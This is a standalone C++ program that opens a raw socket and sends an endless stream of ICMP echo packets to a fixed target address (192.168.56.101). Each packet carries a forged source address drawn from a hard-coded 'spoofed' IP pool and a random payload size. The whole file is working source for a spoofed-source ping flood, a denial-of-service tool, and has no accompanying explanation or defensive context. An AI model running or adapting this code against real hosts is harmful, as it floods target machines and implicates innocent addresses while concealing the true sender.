#include <iostream>
#include <unistd.h>
#include <cstdlib>
#include <ctime>
#include <cstring>
#include <cstdio>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define MAX_PACKET_SIZE 1500

// IP Pool to spoof
const char* spoofed_ips[] = {
    "192.168.1.100", "10.0.0.5", "172.16.0.10",
    "192.168.100.1", "10.10.10.10"
};
const int spoofed_ip_count = sizeof(spoofed_ips) / sizeof(spoofed_ips[0]);

// ICMP checksum calculator
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while(len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if(len) sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main() {
    srand(time(0));

    const char* target_ip = "192.168.56.101";

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Setting IP_HDRINCL failed");
        return 1;
    }

    char packet[MAX_PACKET_SIZE];

    while (true) {
        int data_size = rand() % 1024 + 64;
        int packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + data_size;

        memset(packet, 0, MAX_PACKET_SIZE);

        struct iphdr *ip = (struct iphdr *)packet;
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(packet_size);
        ip->id = rand();
        ip->frag_off = 0;
        ip->ttl = rand() % 96 + 32;
        ip->protocol = IPPROTO_ICMP;
        ip->check = 0;

        const char* spoofed_ip = spoofed_ips[rand() % spoofed_ip_count];
        ip->saddr = inet_addr(spoofed_ip);
        ip->daddr = inet_addr(target_ip);
        ip->check = checksum((unsigned short *)ip, sizeof(struct iphdr));

        struct icmphdr *icmp = (struct icmphdr *)(packet + sizeof(struct iphdr));
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->un.echo.id = rand();
        icmp->un.echo.sequence = rand();
        icmp->checksum = 0;

        char *data = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);
        memset(data, 'X', data_size);

        icmp->checksum = checksum((unsigned short *)icmp, sizeof(struct icmphdr) + data_size);

        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = inet_addr(target_ip);

        if (sendto(sock, packet, packet_size, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("sendto failed");
        } else {
            std::cout << "Sent ICMP packet from " << spoofed_ip
                      << " to " << target_ip
                      << " with size: " << packet_size << " bytes\n";
        }

        usleep((rand() % 400 + 100) * 1000);
    }

    close(sock);
    return 0;
}

